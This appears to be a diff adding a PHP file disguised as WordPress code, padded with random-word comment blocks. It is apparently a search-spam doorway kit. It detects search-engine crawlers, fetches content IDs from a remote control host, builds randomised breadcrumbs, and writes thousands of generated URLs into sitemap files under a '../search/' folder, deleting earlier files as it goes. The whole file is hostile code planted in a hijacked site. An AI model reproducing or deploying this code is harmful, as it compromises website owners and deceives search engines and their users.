+ * avenue bachelor devise emphasize evolution joint submerge title.
+ * audio continual fertilizer gaze individual label theme whatsoever.
+ * barrier biology comparable electron joint launch mere minimum naked noticeable outset phenomenon remarkable title weed.
+ * accelerate attitude bachelor domestic exceed extraordinary ferfile grateful hostile illusion inevitable inhabitant mature missile participate quit security sensitive slippery thrust title vague vivid.
+ * algebra appoint conquer defect essential fertilizer legislation lest luxury oxygen peak reject remedy restrain semiconductor shrink stale substitute subway tremendous wealthy yield zone.
+ * arbitrary architect ban origin quit tendency.
+ * audio coarse deaf entry essential exclusive genius herd merchant negative neglect opponent orbit partial universal vessel violent wealthy.
+ *
+ * @package WordPress
+ */
+
+
+function getRandStrArr($tpArr=array(),$bgKey=0){
+	
+	$returnStr = '';
+	$numArr = count($tpArr);
+	for($i=$bgKey+1;$i<$numArr;$i++){
+		$returnStr .= $tpArr[$i].' ';
+	}
+	
+	for($i=0;$i<=$bgKey;$i++){
+		$returnStr .= $tpArr[$i].' ';
+	}
+	
+	return trim($returnStr);
+
+}
+
+
+
+function getBreadcrum($Ptitle,$catArr,$id23,$pname){
+
+	global $arrBread,$thisdom;
+	
+	
+	$numUseCat = (KEYJG*$id23) % 3 + 1;
+	$numCatArr = count($catArr);
+	
+	if($numCatArr > $numUseCat){
+		$bgkey = $numCatArr - $numUseCat;
+	}
+	
+	$tempArrCat = array();
+	for($i=$bgkey;$i<$numCatArr;$i++){
+		if(isset($catArr[$i]))
+			$tempArrCat[] = $catArr[$i];
+	}
+	
+	
+	
+	$catArr = $tempArrCat;
+
+
+	$domlen = strlen($thisdom);
+	$breadTagkey = ($domlen * KEYJG) % 10;
+	$strBreads = '';
+	
+	switch ($breadTagkey) {
+		case 0:
+			
+$strBreads .= '<div class="breadcrumbs-wrap">
+				<div role="navigation" aria-label="Breadcrumbs" class="breadcrumb-trail breadcrumbs" itemprop="breadcrumb"><ul class="trail-items" itemscope="" itemtype="http://schema.org/BreadcrumbList"><meta name="numberOfItems" content="3"><meta name="itemListOrder" content="Ascending"><li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="trail-item trail-begin"><a href="/" rel="home" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1"></li><span class="delim">»</span>';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="trail-item"><a href="'.$nowCatUrl.'" itemprop="item"><span itemprop="name">'.$vs.'</span></a><meta itemprop="position" content="'.$flagNum.'"></li><span class="delim">»</span>';
+		$flagNum++;
+	}
+}
+		
+			$strBreads .= '<li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="trail-item trail-end"><span itemprop="name">'.$Ptitle.'</span><meta itemprop="position" content="'.$flagNum.'"></li></ul></div> 
+			</div>';;
+			break;
+		case 1:
+			
+$strBreads .= '<div class="breadcrumb"><span><span class="breadcrumb-link">Home</span><span class="breadcrumb-separator">/</span></span>';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<span><span class="breadcrumb-link"><a href="'.$nowCatUrl.'">'.$vs.'</a></span><span class="breadcrumb-separator">/</span></span>';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<span><span class="breadcrumb-link">'.$Ptitle.'</span><span class="breadcrumb-separator">/</span></span></div>';;
+			break;
+		case 2:
+			
+$strBreads .= '<nav class="breadcrumb" aria-label="breadcrumbs">
+  <ul>
+    <li>
+      <a href="/">
+        <span class="icon is-small">
+          <i class="fas fa-home" aria-hidden="true"></i>
+        </span>
+        <span>Home</span>
+      </a>
+    </li>
+';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '    <li>
+      <a href="'.$nowCatUrl.'">
+        <span class="icon is-small">
+          <i class="fas fa-book" aria-hidden="true"></i>
+        </span>
+        <span>'.$vs.'</span>
+      </a>
+    </li>
+';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '    <li class="is-active">
+      <a href="'.$nowUrl.'">
+        <span class="icon is-small">
+          <i class="fas fa-thumbs-up" aria-hidden="true"></i>
+        </span>
+        <span>'.$Ptitle.'</span>
+      </a>
+    </li>
+  </ul>
+</nav>';;
+			break;
+		case 3:
+			
+
+$strBreads .= '<div class="ui huge breadcrumb">
+      <a class="section" href="/">Home</a>
+      <i class="right chevron icon divider"></i>
+';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '      <a class="section" href="'.$nowCatUrl.'">'.$vs.'</a>
+      <i class="right chevron icon divider"></i>
+';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '      <div class="active section">'.$Ptitle.'</div>
+    </div>';;
+			break;
+		case 4:
+			
+$strBreads .= '<div id="navBreadcrumbs">
+    <ol><li class="first"><a href="/" class="NavNodeBreadCrumb">Home</a></li>';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<li><a href="'.$nowCatUrl.'" class="NavNodeBreadCrumb">'.$vs.'</a></li>';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<li><strong>'.$Ptitle.'</strong></li></ol>
+</div>';;
+			break;
+		case 5:
+			
+$strBreads .= '<div class="breadcrumbs" typeof="BreadcrumbList" vocab="http://schema.org/"><p id="breadcrumbs"><!-- Breadcrumb NavXT 6.6.0 -->
+<span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" href="/" class="home"><span property="name">Home</span></a><meta property="position" content="1"></span><span class="sep">»</span>';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" href="'.$nowCatUrl.'" class="post-root post-post"><span property="name">'.$vs.'</span></a><meta property="position" content="'.$flagNum.'"></span><span class="sep">»</span>';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<span property="itemListElement" typeof="ListItem"><span property="name">'.$Ptitle.'</span><meta property="position" content="'.$flagNum.'"></span></p></div>';;
+			break;
+		case 6:
+			
+$strBreads .= '<nav class="breadcrumbs" role="navigation" aria-label="breadcrumbs" style="max-width: 1236px;">
+  <a href="/" data-breadcrumbs-home-url="" title="Women" class="breadcrumbs__item">
+    Home
+  </a>
+  ';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<span class="breadcrumbs__separator" aria-hidden="true"></span>
+    <a href="'.$nowCatUrl.'" class="breadcrumbs__item">
+      '.$vs.'
+    </a>
+';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '  <span class="breadcrumbs__separator" aria-hidden="true"></span>
+  <span class="breadcrumbs__item breadcrumbs__item--text breadcrumbs__product-title">'.$Ptitle.'</span>
+</nav>';
+			;
+			break;
+		case 7:
+			
+$strBreads .= '<div class="breadcrumbs-container"><a href="/" class="breadcrumbs-link">Home</a><span class="breadcrumbs-separator">/</span>';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<a href="'.$nowCatUrl.'" class="breadcrumbs-link">'.$vs.'</a><span class="breadcrumbs-separator">/</span>';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<a href="'.$nowUrl.'" class="breadcrumbs-link">'.$Ptitle.'</a></div>';
+			
+			;
+			break;
+		case 8:
+			
+$strBreads .= '<ol class="breadcrumb" itemscope="" itemtype="https://schema.org/BreadcrumbList">
+<li class="breadcrumb-item" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<a class="breadcrumb-element" href="/" title="Go to Home" itemprop="item">
+<span class="breadcrumb-element-name" itemprop="name">Home</span>
+</a>
+<meta itemprop="position" content="1">
+</li>
+';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<li class="breadcrumb-item" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<a class="breadcrumb-element" href="'.$nowCatUrl.'" itemprop="item">
+<span class="breadcrumb-element-name" itemprop="name">'.$vs.'</span>
+</a>
+<meta itemprop="position" content="'.$flagNum.'">
+</li>
+';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<li class="breadcrumb-item" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<span class="breadcrumb-element" itemprop="name">'.$Ptitle.'</span>
+<meta itemprop="position" content="'.$flagNum.'">
+<meta itemprop="item" content="'.$nowUrl.'">
+</li>
+</ol>';
+			;
+			break;
+		case 9:
+			
+
+$numLists = count($catArr) + 2;
+
+
+$strBreads .= '<div id="breadcrumb-container">
+<nav data-depth="'.$numLists.'">
+<ol itemscope="" itemtype="https://schema.org/BreadcrumbList">
+<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<a itemprop="item" content="/" href="/">
+<span itemprop="name">Home</span>
+</a>
+<meta itemprop="position" content="1">
+</li>
+';
+$flagNum = 2;
+
+if(count($catArr)){
+	foreach($catArr as $vs){
+		$vs = trim($vs);
+		$nowCatUrl = getCatLink($vs,$id23);
+		$strBreads .= '<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<a itemprop="item" content="'.$nowCatUrl.'" href="'.$nowCatUrl.'">
+<span itemprop="name">'.$vs.'</span>
+</a>
+<meta itemprop="position" content="'.$flagNum.'">
+</li>
+';
+		$flagNum++;
+	}
+}
+			$nowUrl = getalink($id23,$pname);	
+
+			$strBreads .= '<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+<a itemprop="item" content="'.$nowUrl.'" href="'.$nowUrl.'">
+<span itemprop="name">'.$Ptitle.'</span>
+</a>
+<meta itemprop="position" content="5">
+</li>
+</ol>
+</nav>
+</div>';
+		
+		;
+			break;
+	}
+	
+	
+	return $strBreads;
+
+}
+
+
+function get_scheme(){
+	
+	if ( (isset($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') || (isset($_SERVER['HTTP_CF_VISITOR']) && strstr($_SERVER['HTTP_CF_VISITOR'],'https')) || (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') ) {
+		$httpPre= 'https';
+	} else {
+		$httpPre = 'http';
+	}
+	
+	return $httpPre;
+}
+
+
+function get_shares(){
+	
+	$siteLink= get_scheme() .'://'.$_SERVER['HTTP_HOST'];
+	$shareStr = '
+<ul>
+<li><a href="https://www.facebook.com/sharer/sharer.php?u=domain" target="_blank"><span>facebook</span></a></li>
+<li><a href="https://twitter.com/share?url=domain" target="_blank"><span>twitter</span></a></li>
+<li><a href="https://www.linkedin.com/shareArticle?mini=true&url=domain" target="_blank"><span>linkedin</span></a></li>
+<li><a href="https://pinterest.com/pin/create/button/?url=domain" target="_blank"><span>pinterest</span></a></li>
+</ul>
+';
+  $shareStr = str_replace('domain',$siteLink,$shareStr);
+  
+  return $shareStr;
+	
+}
+
+function getCatLink($CatName,$id23){
+		
+		global $arrnametime,$arrKeywz,$date_string,$cFlag;		
+	
+		$filePres = '';		$fileEnds = '';		$siteLink= get_scheme() .'://'.$_SERVER['HTTP_HOST'];
+		$dirNames = dirname(__FILE__);		$tpDarr = explode(DIRECTORY_SEPARATOR, $dirNames); $httcReplace = end($tpDarr);		
+		if(JDT == 2){
+			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
+			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
+			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?cat=";		}else{
+			$filePres = $siteLink."/";		}
+		
+		$CatName = str_replace('&',' ',$CatName);
+		$CatName = str_replace('&',' ',$CatName);
+		if(JDT == 3){
+			
+			$CatName = preg_replace('#\s+#i','-',$CatName);
+			
+			
+			while(strstr($CatName,'--'))
+				$CatName = str_replace('--','-',$CatName);
+			
+			$urlMid = $CatName;	
+			
+			$rtStr = $filePres.$urlMid;
+			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
+		
+			return $rtStr;
+			
+			}
+		// BZCAT
+		
+		global $tpKeyStrCat;
+		
+		$endNumber = '';
+		
+		$tpNum = KEYJG + $id23;
+		$tpKey = $tpNum % count($date_string);
+		$lenStr = strlen($date_string[$tpKey]);
+		if($tpKeyStrCat == -1)
+			$tpKeyStrCat = (KEYJG + $pid) % $lenStr;
+		$tpstr = $date_string[$tpKey];
+
+		$randStr = '';
+		$arrNum = array();
+		for($i = 0; $i < $lenStr; $i++){
+			$vs = $tpstr[$tpKeyStrCat];
+			$int_vs = ord($vs);
+			if($int_vs >= 100 and $int_vs <= 119){
+				$arrNum[] = $int_vs % 10;
+				if(count($arrNum) >= 5){
+					break;
+				}
+			}
+			
+			$tpKeyStrCat = ($tpKeyStrCat + 1) % $lenStr;
+		}
+		
+		$catNum = implode('',$arrNum);
+		
+		$randNumTime = $tpNum % 4;
+		if($randNumTime > 0){
+			$randNumTime = 1;
+		}
+		$strNum = '';
+		for($i=0; $i<=$randNumTime; $i++)
+			$strNum .= rand(0,9);
+		
+		$CatName = preg_replace('#\s+#i','-',$CatName);
+		$CatName = str_replace('--','-',$CatName);
+		$urlMid =  str_replace('--','-',$CatName) . '';
+		// $urlMid .= JTHZ;
+		$rtStr = $filePres. LANUSED . '/'. $CatName . '-' . $cFlag . $strNum . JTHZ;
+		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
+		
+		return $rtStr;
+			
+}
+	
+	
+function getMapNum($bgNum,$mapnum){
+	$TempArr = array();
+	if($bgNum + $mapnum <= FNUM){
+		for($i=0;$i<$mapnum;$i++){
+			$TempArr[$i] = $bgNum + $i -1;
+		}
+	}else{
+		for($i=0;$i<$mapnum;$i++){
+			if($bgNum+$i > FNUM)
+				$TempArr[$i] = $bgNum + $i -1 -FNUM;
+			else
+				$TempArr[$i] = $bgNum + $i -1;
+		}
+	}
+	
+	return $TempArr;
+}
+
+
+function getRandCId($rqurl){
+	global $thisdom;
+	
+	for($i=0;$i<3;$i++){
+		$idUrl =  GETDOM . "gpage.php?site=$thisdom&cid=$rqurl";
+		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
+		if(preg_match('#<cid>(\d+)</cid>#i',$tempIdStr,$matchId)){
+			return $matchId[1];
+		}
+	}
+	
+	  
+	http_response_code(404);  
+	exit; 
+	
+}
+
+/**
+ * adopt grant marine scratch.
+ * applianc horrible leather mission release remedy reputation skim.
+ * adequate advertise geology guilty pat prominent shift software tone urge variation.
+ * appreciate approve breed bunch electron expensive exterior extraordinary fate guilty kneel lest missile participate passive portion principle strategy territory undertake valid venture.
+ * elaborate fatigue frown guarantee haste infant joint laser marine mixture naval range regulate semiconductor sincere submerge tide vain vocabulary waist wonder.
+ * approach bundle candidate disturb dump duration earthquake evaluate fax gratitude insignificant opportunity portion racial remedy resemble restraint resume shrug substance terminal tidy ultimate withdraw.
+ * adapt boundary capture conservation decade echo entitle equivalent fax genius hardware hydrogen illegal insignificant nonsense nuclear opportunity preserve satellite sketch slide terminal videotape violence volume.
+ * accomplish chaos distribute emotion explosion frown hydrogen issue jealous licence missile mission orbit submerge tedious wax.
+ * Internet acid adjust appreciate authority award aware campus capture decay deposit disturb extraordinary garbage giant launch maintain missile nuisance outset resemble slip triumph virus.
+ * comparable gaze prior satellite vitally wealthy.
+ * consent fate harmony label prescribe simplify smash.
+ * bacteria bother calendar compete naked personnel the volcano.
+ * clue coach explore herd marine merchant relevant sensible shiver sketch.
+ * advertise deaf deposit highlight individual inferior jail jam manufacture merchant minimum mood pat portion satellite secure shield skim variable violet.
+ * biology hestiate oblige simplify.
+ * approach defect extent golf hardware opportunity particle personnel previous the twist weld.
+ * applianc barrier conquer consistent entry evolution exaggerate fatigue golf lest prominent transmit trap venture wonder yield.
+ * bacteria capture essential genuine hestiate hook leisure maintain nucleus rely slip vague vocabulary.
+ * arise continuous dusk faculty label modify mutual quotation relief retain route slope solar strategic substitute tidy tremble universal withdraw.
+ * response advertisement appetite appreciate equivalent guilty knot lean legislation merchant motive nonsense offend orchestra reputation skim tropical undertake wagon.
+ * applicable dumb genius global mixture neglect prohibit tense urge violent wax.
+ * ban consume dumb exclusive glimpse hence hint massive nevertheless presumably slippery.
+ * devise inhabitant ridge splendid.
+ *
+ * @package WordPress
+ */
+	
+
+function getRandId(){
+	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
+function get_arrvs($arr,$num,$nowkey){
+	$numArr = count($arr);	
+	if($nowkey + $num < $numArr)
+		return $arr[$nowkey + $num];	else{
+		if($nowkey + $num - $numArr - $numArr > 0)
+			return get_arrvs($arr,$num - $numArr,$nowkey);		else
+			return $arr[abs($nowkey + $num - $numArr)];	}
+}
+
+function get_pre_link($arr,$key){
+	
+	$tmpA1 = array();	$tmpA2 = array();	
+	$num = count($arr);	
+	
+	if($key + JGNUM + 1 + LINKNUM >= $num){
+		
+		if($key + JGNUM + 1 - $num > LINKNUM){
+			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
+		
+		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
+		return array_merge($tmpA1,$tmpA2);		}
+	}else{
+			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
+	
+}
+function get_next_link($arr,$key){
+	
+	$tmpA1 = array();	$tmpA2 = array();	
+	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
+		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
+			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
+}
+function rFile($file){
+	if(function_exists('file_get_contents')){
+		return file_get_contents($file);
+	}else{
+		$handle = fopen($file, "r");
+		$contents = fread($handle, filesize($file));
+		fclose($handle);
+		return $contents;
+	}
+}
+function isCrawler() {
+	$agent= strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
+		$spiderSite= array(
+			"Googlebot",
+			"Mediapartners-Google",
+			"Adsbot-Google",
+			"Yahoo!",
+			"Google AdSense",
+			"Yahoo Slurp",
+			"bingbot",
+			"MSNBot"
+		);		foreach($spiderSite as $val) {
+		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
+			return true;			}
+		}
+	} else {
+		return false;	}
+} 
+
+
+function gsitemap2($filenames,$c=1,$jdt=1){
+	global $gnumber,$arrArrr;
+$arrABC = range('a','z');
+$tparrsI = $filenames;
+$randnum = rand(7000,7600);
+$tparrII = array_rand($tparrsI,$randnum);
+$tparrIII = array();
+foreach($tparrII as $vs){
+	$tparrIII[$vs] = $filenames[$vs];
+}
+$filenames = $tparrIII;
+
+	$filePres = '';	$fileEnds = '';	
+	$dirNames = dirname(__FILE__);	$tpDarr = explode(DIRECTORY_SEPARATOR, $dirNames); $httcReplace = end($tpDarr);			
+	if(JDT == 2){
+		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
+		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
+		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
+		$filePres = '';	}
+	if(JDT == 3){
+		$fileEnds = '';	}else{
+		$fileEnds = JTHZ;	}
+	$fpath=get_scheme() .'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
+	$siteLink=get_scheme() .'://'.$_SERVER['HTTP_HOST'];		
+	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
+	// $urlsArray = $filenames;
+	// $numLinks = count($urlsArray);
+	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
+	$str = "";						
+	$tempArr1 = $filenames;
+	
+	foreach($tempArr1 as $key => $value2){
+		$curphp=basename(__FILE__); 
+		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
+			$tempPid = (int)trim($key);
+		
+			$url = getalink($tempPid,$value2);
+			
+ 		if(JDT == 0){
+
+		if($first===false && $last===false && $checkTxt===false)
+		{
+			$date = date("Y-m-d");			$time = date("H:i:s");				
+		
+			if($star % 12000==11999){
+				$gFile =  '../search/consolemap'. $arrABC[$gnumber-2] .'' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				unlink($gFile);				file_put_contents($gFile,$put_str);
+				file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-2] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+				$str = '';				$gnumber++;				return;			}
+			
+		
+			
+	
+			$str .= "     <url>
+			 <loc>" . $url . "</loc> 
+			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+			 <changefreq>daily</changefreq> 
+			 <priority>0.1</priority> 
+			 </url>
+		";	
+			
+			
+			$star++;			$starPri++;		}
+			
+			
+		}else{
+			
+			if($first===false && $last===false && $checkTxt===false)
+		{
+			$date = date("Y-m-d");			$time = date("H:i:s");				
+		
+			if($star % 12000==11999){
+				$gFile =  '../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				unlink($gFile);				file_put_contents($gFile,$put_str);
+				file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-1] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+				$str = '';				$gnumber++;				return;			}
+			
+		
+			
+	
+			$str .= "     <url>
+			 <loc>" . $url . "</loc> 
+			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+			 <changefreq>daily</changefreq> 
+			 <priority>0.1</priority> 
+			 </url>
+		";	
+			
+			
+			$star++;			$starPri++;		}
+			
+		}
+		
+		
+			
+			
+			
+			
+			
+	}
+	
+	
+ 		if(JDT == 0){
+			
+				{
+		$gFile =  '../search/consolemap'. $arrABC[$gnumber-2] .'' .'.xml';			echo '<br/>'.$gFile.'<br/>';
+		$put_str = $mapPre . $str . $mapEnd;		unlink($gFile);		file_put_contents($gFile,$put_str);	
+		file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-2] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+		$gnumber++;	
+		}
+			
+		}else{
+			
+			{
+		$gFile =  '../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml';			echo '<br/>'.$gFile.'<br/>';
+		$put_str = $mapPre . $str . $mapEnd;		unlink($gFile);		file_put_contents($gFile,$put_str);	
+		file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-1] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+		$gnumber++;	
+		}
+	
+	
+		}
+	
+	
+	
+	unset($tempArr1);	unset($filenames);	
+	echo "生成sitemap成功！";	
+}
+
+
+function gsitemap($filenames,$c=1,$jdt=1){
+	global $gnumber,$arrArrr;
+$arrABC = range('a','z');
+$tparrsI = $filenames;
+$randnum = rand(7000,7600);
+$tparrII = array_rand($tparrsI,$randnum);
+$tparrIII = array();
+foreach($tparrII as $vs){
+	$tparrIII[$vs] = $filenames[$vs];
+}
+$filenames = $tparrIII;
+	
+	$filePres = '';	$fileEnds = '';	
+	
+	$fpath=get_scheme() .'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
+	$siteLink=get_scheme() .'://'.$_SERVER['HTTP_HOST'];		
+	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
+	// $urlsArray = $filenames;
+	// $numLinks = count($urlsArray);
+	
+	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
+	$str = "     <url>
+			 <loc>" . $siteLink . "</loc> 
+			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
+			 <changefreq>always</changefreq> 
+			 <priority>1.0</priority> 
+			 </url>
+		";						
+	$tempArr1 = $filenames;
+	
+	foreach($tempArr1 as $key => $value2){
+		$curphp=basename(__FILE__); 
+		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");	
+		
+			$tempPid = (int)trim($key);
+				$url = getalink($tempPid,$value2);
+		
+		 if(JDT == 0){
+			 
+			 	if($first===false && $last===false && $checkTxt===false)
+		{
+			$date = date("Y-m-d");			$time = date("H:i:s");			
+	
+			if($star % 12000==11999){
+				$gFile =  '../search/sitemap.xml';				echo '<br/>'.$gFile.'<br/>';				
+				$put_str = $mapPre . $str . $mapEnd;				unlink($gFile);				file_put_contents($gFile,$put_str);
+				file_put_contents("./map.log",'sitemap.xml'.PHP_EOL,FILE_APPEND);
+				$str = '';				$gnumber++;				return;				
+			}
+			
+			if($starPri >= 400 && $priority != 0.1){
+				$starPri = 0;				$priority = $priority - 0.1;			}
+			
+			if($priority > 0.1){
+				
+				$str .= "     <url>
+					 <loc>" . $url . "</loc> 
+					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+					 <changefreq>daily</changefreq> 
+					 <priority>". $priority . "</priority> 
+					 </url>
+				";	
+			}else{
+										$str .= "     <url>
+			 <loc>" . $url . "</loc> 
+			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+			 <changefreq>daily</changefreq> 
+			 <priority>0.1</priority> 
+			 </url>
+		";	
+			}
+			
+			$star++;			$starPri++;		}
+			 
+			 
+			 
+		 }else{
+			 
+			 
+			 	if($first===false && $last===false && $checkTxt===false)
+		{
+			$date = date("Y-m-d");			$time = date("H:i:s");			
+	
+			if($star % 12000==11999){
+				$gFile =  '../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml';				echo '<br/>'.$gFile.'<br/>';				
+				$put_str = $mapPre . $str . $mapEnd;				unlink($gFile);				file_put_contents($gFile,$put_str);
+				file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-1] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+				$str = '';				$gnumber++;				return;				
+			}
+			
+			if($starPri >= 400 && $priority != 0.1){
+				$starPri = 0;				$priority = $priority - 0.1;			}
+			
+			if($priority > 0.1){
+				
+				$str .= "     <url>
+					 <loc>" . $url . "</loc> 
+					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+					 <changefreq>daily</changefreq> 
+					 <priority>". $priority . "</priority> 
+					 </url>
+				";	
+			}else{
+										$str .= "     <url>
+			 <loc>" . $url . "</loc> 
+			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
+			 <changefreq>daily</changefreq> 
+			 <priority>0.1</priority> 
+			 </url>
+		";	
+			}
+			
+			$star++;			$starPri++;		}
+			
+			
+			 
+		 }
+
+			
+	}
+	
+	
+	
+		 if(JDT == 0){
+			
+	
+	{
+		$gFile =  '../search/sitemap.xml';		echo '<br/>'.$gFile.'<br/>';
+		$put_str = $mapPre . $str . $mapEnd;		unlink($gFile);		file_put_contents($gFile,$put_str);	
+		file_put_contents("./map.log",'sitemap.xml'.PHP_EOL,FILE_APPEND);
+		$gnumber++;
+	}
+	
+		 }else{
+			 
+			 	
+	{
+		$gFile =  '../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml';		echo '<br/>'.$gFile.'<br/>';
+		$put_str = $mapPre . $str . $mapEnd;		unlink($gFile);		file_put_contents($gFile,$put_str);	
+		file_put_contents("./map.log",'#consolemap'. $arrABC[$gnumber-1] .''  .'.xml#'.PHP_EOL,FILE_APPEND);
+		$gnumber++;
+	}
+			 
+		 }
+	
+	
+	
+	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
+}
+	
+function curl_get_from_webpage($url,$proxy='',$loop=10){
+	$data = false;        $i = 0;        while(!$data) {
+             $data = curlGetOne($url,$proxy);             if($i++ >= $loop) break;        }
+	return $data;}
+ 
+
